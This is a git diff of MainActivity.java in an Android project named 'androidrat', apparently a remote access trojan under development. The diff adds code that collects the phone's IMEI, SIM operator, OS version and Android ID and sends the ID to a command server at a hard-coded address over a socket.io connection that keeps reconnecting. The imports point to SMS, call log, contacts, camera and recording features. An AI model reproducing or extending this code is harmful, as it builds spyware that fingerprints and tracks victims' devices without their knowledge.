@@ -1,6 +1,7 @@
 package com.ot.androidrat;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -8,6 +9,7 @@ import androidx.core.content.ContextCompat;
 import android.Manifest;
 import android.content.ContentProviderOperation;
 import android.content.ContentResolver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.OperationApplicationException;
 import android.content.pm.PackageManager;
@@ -18,11 +20,13 @@ import android.graphics.SurfaceTexture;
 import android.hardware.Camera;
 import android.media.MediaRecorder;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.RemoteException;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.View;
@@ -30,6 +34,7 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.telephony.TelephonyManager;
 
 import org.json.JSONArray;
 import org.json.JSONException;
@@ -185,7 +190,14 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.O)
     public void ioConnection(View view){
+        TelephonyManager tm = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
+        String simOperatorName = tm.getSimOperatorName();
+        String imei = tm.getImei();
+        // String phoneNo = tm.getLine1Number();
+        int osVersion = android.os.Build.VERSION.SDK_INT;
+        String android_id = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
         try{
             IO.Options opts = new IO.Options();
             opts.reconnection = true;
@@ -193,13 +205,10 @@ public class MainActivity extends AppCompatActivity {
             opts.reconnectionDelayMax = 999999999;
             ioSocket = IO.socket("http://192.168.156.11:5001/");
             ioSocket.connect();
-            ioSocket.emit("pong", "pong reponse");
-            ioSocket.on("ping", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    ioSocket.emit("pong", "pong reponse");
-                    Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_LONG).show();
-                }
+            ioSocket.emit("pong", android_id);
+            ioSocket.on("ping", args -> {
+                ioSocket.emit("pong", "pong reponse");
+                Toast.makeText(MainActivity.this, "received ping", Toast.LENGTH_LONG).show();
             });
         }catch  (Exception ex){
             Log.i("Socket", ex.getMessage());
